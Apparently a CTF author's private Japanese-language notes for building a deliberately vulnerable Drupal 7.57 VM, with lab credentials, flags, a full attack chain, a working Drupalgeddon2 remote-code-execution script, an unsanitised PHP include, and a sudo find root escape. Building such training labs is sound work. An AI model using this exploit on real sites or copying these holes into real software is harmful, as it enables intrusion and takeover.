# OPERATOR-NOTES — 出題者専用 機密ノート

> ⚠️ **このファイルは絶対に公開しないこと**
>
> - リポジトリ `skjshr/tgtsec` は **private** 前提
> - **public** に切り替える際は、このファイルを **削除 + git履歴書き換え**
>   ```bash
>   git filter-repo --path OPERATOR-NOTES.md --invert-paths
>   ```
>   または別リポジトリに分離
> - もし誤って公開してしまったら、**全パスワード即変更 + 全フラグ再生成**

---

## 1. 認証情報・フラグ(完全版)

### Linux アカウント

| ユーザー | パスワード | 用途 |
|---------|----------|------|
| `root` | `admin` | VM起動時のroot(初期インストール時設定) |
| `user` | (元々の起動時パスワード) | VM owner — 配布前に cleanup でロック |
| `yamamoto` | `Sakura@2011` | CTF意図のターゲットユーザー |

### Drupal

| 項目 | 値 |
|-----|---|
| 管理ユーザー名 | `yamamoto` |
| 管理パスワード | `Sakura@2011` (SSHと同じ — 使い回し意図) |
| サイト名 | `Yamamoto Mfg. Blog` |
| 管理メール | `t.yamamoto@yamamoto-mfg.co.jp` |

### MariaDB

| 項目 | 値 |
|-----|---|
| root認証 | unix_socket (パスワードなし) |
| DB名 | `yamamoto_blog` |
| DB ユーザー | `drupal` |
| DB パスワード | `Dru9al_S3cret_2011` |

### フラグ(現行)

```
WEB:  TSHL{5268d0547c04e6cfa72acf47}  /var/www/.flag1.txt
USER: TSHL{a48e406f3b221dbc539b32db}  /home/yamamoto/user.txt
ROOT: TSHL{ecd482c813c9323c011ed1b0}  /root/root.txt
```

VM内では `/root/.ctf-flags-master.txt` に同じ内容を保存。

---

## 2. 攻撃チェーン(完全)

```
[1] nmap → 22/SSH, 80/HTTP
[2] http://target/ で ?page= LFI 発見
[3] LFI: ?page=/var/www/maintenance.txt → /blog/ + Drupal 7.57 確認
[4] /blog/CHANGELOG.txt で Drupal 7.57 確定
[5] CVE-2018-7600 (Drupalgeddon2) で www-data RCE
[6] /var/www/.flag1.txt 取得 → FLAG 1
[7] /var/backups/yamamoto-personal-notes.txt 読取 → password "Sakura@2011"
[8] ssh yamamoto@target → /home/yamamoto/user.txt → FLAG 2
[9] sudo -l → /usr/bin/find が NOPASSWD
[10] sudo find . -exec /bin/sh \; -quit → root シェル
[11] /root/root.txt → FLAG 3
```

### Drupalgeddon2 PoC (動作確認済み)

```python
import requests, re, sys
target = "http://<TARGET>/blog/"
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

r = requests.post(
    target + "?q=user/password&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=" + cmd,
    data={"form_id": "user_pass", "_triggering_element_name": "name"}
)
fbid = re.search(r'name="form_build_id" value="([^"]+)"', r.text).group(1)
r2 = requests.post(target + f"?q=file/ajax/name/%23value/{fbid}", data={"form_build_id": fbid})
print(r2.text.split('[{"command"')[0])
```

---

## 3. 構築アーキテクチャ(復旧用)

### OS
- Debian 13 (trixie) — VirtualBox VM
- ホスト名: `yamamoto-web01`
- 主ディスク: 19GB, 7GB使用

### 採用ソフトウェアバージョン

| ソフト | バージョン | 入手元 |
|-------|----------|--------|
| Apache | 2.4.66 (Debian標準) | apt |
| **PHP** | **7.0.33** | **deb.sury.org (重要)** |
| MariaDB | 11.8.6 (Debian標準) | apt |
| Drupal | **7.57** (脆弱性版) | https://ftp.drupal.org/files/projects/drupal-7.57.tar.gz |

### PHP 7.0 採用理由
- Drupal 7.57 は Drupalgeddon2 (CVE-2018-7600) の対象 — 7.58 で修正
- Drupal 7.57 は PHP 7.4+ で `field_attach_load()` 未定義エラー等の致命的非互換あり
- PHP 7.3 でも同様の問題発生
- → PHP 7.0.33 (sury repo) でクリーンに動作確認済み

### sury repo セットアップ手順
```bash
curl -sSL https://packages.sury.org/php/apt.gpg -o /etc/apt/trusted.gpg.d/sury-php.gpg
echo "deb https://packages.sury.org/php/ trixie main" > /etc/apt/sources.list.d/sury-php.list
apt update
apt install -y libapache2-mod-php7.0 php7.0 php7.0-{cli,common,mysql,gd,xml,mbstring,curl,zip}
a2dismod php7.4 || true
a2enmod php7.0
systemctl restart apache2
```

### Drupal インストール時の落とし穴
- インストーラーは多段バッチ処理 (curl で再帰的にmeta refresh URLを叩く必要あり)
- 進捗100%でも `op=finished` URL を踏まないと "Configure site" に遷移しない
- 詳細は本リポジトリの Bash履歴を参照(必要なら別途スクリプト化)

---

## 4. 仕掛けの詳細(再現用)

### LFI (メインサイト)
**ファイル**: `/var/www/html/index.php`
```php
$page = isset($_GET['page']) ? $_GET['page'] : 'pages/home.php';
include($page);   // ← サニタイズなし
```
- LFIで `/etc/passwd`, `php://filter`, `/var/www/maintenance.txt` 等読み取り可能

### LFI hint file
**ファイル**: `/var/www/maintenance.txt` (mode 644, root所有)
- Drupal 7.57 / `/blog/` パス / SA-CORE-2018-002 への言及あり
- LFI 経由で `?page=/var/www/maintenance.txt` でしか読めない位置(URL直接アクセス不可)

### password reuse leak file
**ファイル**: `/var/backups/yamamoto-personal-notes.txt` (mode 644, yamamoto所有)
- 平文で `Sakura@2011` 記載
- WWW-data 権限から読める(www-data → yamamoto pivot 用)

### sudo 誤設定
**ファイル**: `/etc/sudoers.d/yamamoto-find`
```
yamamoto ALL=(ALL) NOPASSWD: /usr/bin/find
```
- GTFOBins の find sudo技で root 取得可能

---

## 5. 復旧シナリオ別チェックリスト

### A) フラグだけ再生成したい
```bash
WEB=$(echo "TSHL{$(openssl rand -hex 12)}")
USER=$(echo "TSHL{$(openssl rand -hex 12)}")
ROOT=$(echo "TSHL{$(openssl rand -hex 12)}")

# ファイルの中身を上書き(マスター記録も更新)
# 詳細は /root/ にあった元のスクリプト参照
```

### B) パスワードを変えたい
1. `passwd yamamoto` で新パスワード設定
2. Drupal admin パスワードも合わせる:
   ```bash
   cd /var/www/html/blog
   php scripts/password-hash.sh '<新パスワード>'
   # 出てきたハッシュを users テーブルに UPDATE
   ```
3. `/var/backups/yamamoto-personal-notes.txt` の文言を更新

### C) ゼロから VM を作り直したい
1. クリーンな Debian 13 VM 用意
2. 上記「sury repo セットアップ手順」を実行
3. Drupal 7.57 を tarball 取得 → `/var/www/html/blog/` に展開
4. MariaDB に DB + ユーザー作成
5. Drupal インストーラを curl で多段バッチ処理 (面倒)
6. メインサイトの index.php / pages/*.php / header.php / footer.php を配置
7. `/var/www/maintenance.txt` 配置
8. yamamoto user 作成
9. `/var/backups/yamamoto-personal-notes.txt` 配置
10. sudoers.d/yamamoto-find 配置
11. 3つのフラグ配置
12. cosmetic touches (motd, issue.net, hostname)

→ **将来的に `setup.sh` として全自動スクリプト化を推奨**

---

## 6. 既知の "ゆるさ" / 想定外解法

意図された解法以外で root 取れる経路があれば追記。現時点で把握済み:

- **dir bruteforce で /blog/ 直接発見可能** — LFI 経由でなくても可。これは意図通り(複数経路OK)
- **Drupalgeddon2 はメタスプロイトでも一発** — `exploit/unix/webapp/drupal_drupalgeddon2`。これも想定内
- **CMS/Drupal hash crack** — yamamoto の Drupal admin hash を `john --format=phpass` でクラック可能(が、`Sakura@2011` は rockyou.txt にないので失敗するはず)。プレイヤーが諦めてプレーンテキスト探しに走るので問題なし

---

## 7. 配布前 cleanup スクリプトの効能・限界

`/root/cleanup-before-distribution.sh` がやること:
- `user` の sudo 権限剥奪、パスワードロック、個人データ削除
- ログtruncate、shell history削除
- /root/ の構築ツール削除 (.claude, .codex, node_modules)

やらないこと(意図的に残す):
- `/root/CTF-WRITEUP.md` (root取らないと読めないので残してOK)
- `/root/.ctf-flags-master.txt` (同上)
- `/root/CTF-README.md`
- `/var/backups/yamamoto-personal-notes.txt` (CTFの一部!)

---

## 8. 連絡先

このCTFの出題者: takes-security-hacking-lab
リポジトリ管理者: skjshr
